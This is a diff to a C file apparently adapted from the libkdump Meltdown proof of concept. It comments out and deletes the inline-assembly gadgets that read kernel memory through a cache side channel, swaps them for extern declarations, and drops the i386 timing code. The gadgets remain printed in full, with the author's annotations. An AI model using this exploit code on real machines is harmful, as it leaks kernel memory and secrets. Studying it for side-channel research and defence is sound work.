@@ -43,71 +43,37 @@ static libkdump_config_t config;
 // #ifdef __x86_64__
 
 // ---------------------------------------------------------------------------
-#define meltdown                                                               \
-  asm volatile("1:\n"                                                          \
-               "movq (%%rsi), %%rsi\n"                                         \ // reads 8 bytes at rsi (which is 0?)
-               "movzx (%%rcx), %%rax\n"                                         \// zero-extends the byte at rcx(kernel address) into rax (temp storage)
-               "shl $12, %%rax\n"                                              \ //mult rax by 4096 ( shift binary left by 12)
-               "jz 1b\n"                                                       \
-               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \//syntax, rbs+rax*1 to rbx (read at this memory to create side channel)
-               :                                                               \
-               : "c"(phys), "b"(mem), "S"(0)                                   \ //constraints: rcx=phys, rbx=mem, rsi=0
-               : "rax"); // clobbered register
+#define meltdown extern uint64_t meltdown(const uint8_t *phys, const uint64_t *mem)                                                              
+  //asm volatile("1:\n"                                                          \
+  //             "movq (%%rsi), %%rsi\n"                                         \ // reads 8 bytes at rsi (which is 0?)
+  //             "movzx (%%rcx), %%rax\n"                                         \// zero-extends the byte at rcx(kernel address) into rax (temp storage)
+  //             "shl $12, %%rax\n"                                              \ //mult rax by 4096 ( shift binary left by 12)
+  //             "jz 1b\n"                                                       \
+  //             "movq (%%rbx,%%rax,1), %%rbx\n"                                 \//syntax, rbs+rax*1 to rbx (read at this memory to create side channel)
+  //             :                                                               \
+  //             : "c"(phys), "b"(mem), "S"(0)                                   \ //constraints: rcx=phys, rbx=mem, rsi=0
+  //             : "rax"); // clobbered register
 
 // ---------------------------------------------------------------------------
-#define meltdown_nonull                                                        \
-  asm volatile("1:\n"                                                          \ //no rsi? TODO: why??
-               "movzx (%%rcx), %%rax\n"                                         \
-               "shl $12, %%rax\n"                                              \
-               "jz 1b\n"                                                       \
-               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
-               :                                                               \
-               : "c"(phys), "b"(mem)                                           \
-               : "rax");
+#define meltdown_nonull extern uint64_t meltdown_nonull(const uint8_t *phys, const uint64_t *mem)                                                         \
+  //asm volatile("1:\n"                                                          \ //no rsi? TODO: why??
+  //             "movzx (%%rcx), %%rax\n"                                         \
+  //             "shl $12, %%rax\n"                                              \
+  //             "jz 1b\n"                                                       \
+  //             "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
+  //             :                                                               \
+  //             : "c"(phys), "b"(mem)                                           \
+  //             : "rax");
 
 // ---------------------------------------------------------------------------
-#define meltdown_fast                                                          \
-  asm volatile("movzx (%%rcx), %%rax\n"                                         \ //no redo if theses zero
-               "shl $12, %%rax\n"                                              \
-               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
-               :                                                               \
-               : "c"(phys), "b"(mem)                                           \
-               : "rax");
+#define meltdown_fast extern uint64_t meltdown_fast(const uint8_t *phys, const uint64_t *mem)                                                                \
+  //asm volatile("movzx (%%rcx), %%rax\n"                                         \ //no redo if theses zero
+  //             "shl $12, %%rax\n"                                              \
+  //             "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
+  //             :                                                               \
+  //             : "c"(phys), "b"(mem)                                           \
+  //             : "rax");
 
-// #else /* __i386__ */
-
-// // ---------------------------------------------------------------------------
-// #define meltdown                                                               \
-//  asm volatile("1:\n"                                                           \
-//               "movl (%%esi), %%esi\n"                                          \
-//               "movzx (%%ecx), %%eax\n"                                          \
-//               "shl $12, %%eax\n"                                               \
-//               "jz 1b\n"                                                        \
-//               "mov (%%ebx,%%eax,1), %%ebx\n"                                   \
-//               :                                                                \
-//               : "c"(phys), "b"(mem), "S"(0)                                    \
-//               : "eax");
-
-// // ---------------------------------------------------------------------------
-// #define meltdown_nonull                                                        \
-//   asm volatile("1:\n"                                                          \
-//                "movzx (%%ecx), %%eax\n"                                         \
-//                "shl $12, %%eax\n"                                              \
-//                "jz 1b\n"                                                       \
-//                "mov (%%ebx,%%eax,1), %%ebx\n"                                  \
-//                :                                                               \
-//                : "c"(phys), "b"(mem)                                           \
-//                : "eax");
-
-// // ---------------------------------------------------------------------------
-// #define meltdown_fast                                                          \
-//   asm volatile("movzx (%%ecx), %%eax\n"                                         \
-//                "shl $12, %%eax\n"                                              \
-//                "mov (%%ebx,%%eax,1), %%ebx\n"                                  \
-//                :                                                               \
-//                : "c"(phys), "b"(mem)                                           \
-//                : "eax");
-// #endif
 
 #ifndef MELTDOWN
 #define MELTDOWN meltdown_nonull
@@ -146,12 +112,8 @@ static inline uint64_t rdtsc() {
   asm volatile("mfence");
 #if defined(USE_RDTSCP) && defined(__x86_64__)
   asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
-#elif defined(USE_RDTSCP) && defined(__i386__)
-  asm volatile("rdtscp" : "=A"(a), :: "ecx");
 #elif defined(__x86_64__)
   asm volatile("rdtsc" : "=a"(a), "=d"(d));
-#elif defined(__i386__)
-  asm volatile("rdtsc" : "=A"(a));
 #endif
   a = (d << 32) | a;
   asm volatile("mfence");
